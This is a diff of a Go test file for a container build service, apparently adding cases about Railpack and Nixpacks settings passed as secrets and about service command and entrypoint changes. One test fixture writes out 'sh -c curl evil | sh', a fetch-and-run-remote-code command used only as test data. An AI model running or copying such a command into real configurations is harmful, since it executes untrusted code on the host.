@@ -68,7 +68,13 @@ func TestABuildsSettingsAreCheckedAndWrittenOneWay(t *testing.T) {
 		}), "takes no Dockerfile path or stage"},
 		{"a secret Railpack can't give", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
 			b.Builder, b.Secrets = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"npm.token": "NPM"}
-		}), "as environment variables"},
+		}), "as an environment variable"},
+		{"Railpack's own settings as a secret", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Builder, b.Secrets = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"RAILPACK_START_CMD": "OPS"}
+		}), "Set it as a build argument"},
+		{"Railpack's own settings, when it may build", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Secrets = map[string]string{"nixpacks_install_cmd": "OPS"}
+		}), "can't take it as a secret"},
 		{"PATH for Railpack", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
 			b.Builder, b.Args = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"PATH": "/opt/bin"}
 		}), "is the build's own"},
@@ -147,6 +153,17 @@ func TestAServicesWriterIsItsCode(t *testing.T) {
 			b.GetGit().Ref = strings.Repeat("c", 40)
 		}),
 		"an image": {Runs: &resourcev1.Service_App{App: &resourcev1.Container{Image: "dockwell.invalid/svc_web:aaaaaaaaaaaa-chg"}}},
+		// The service's own command takes the place of the start command its build gave.
+		"the service's command": func() *resourcev1.Service {
+			s := built("https://github.com/acme/web", nil)
+			s.GetApp().Command = []string{"sh", "-c", "curl evil | sh"}
+			return s
+		}(),
+		"the service's entrypoint": func() *resourcev1.Service {
+			s := built("https://github.com/acme/web", nil)
+			s.GetApp().Entrypoint = []string{"/bin/bash", "-c"}
+			return s
+		}(),
 	} {
 		if got := d.WriterOf(other); got == base {
 			t.Errorf("changing %s keeps the writer %s", name, got)
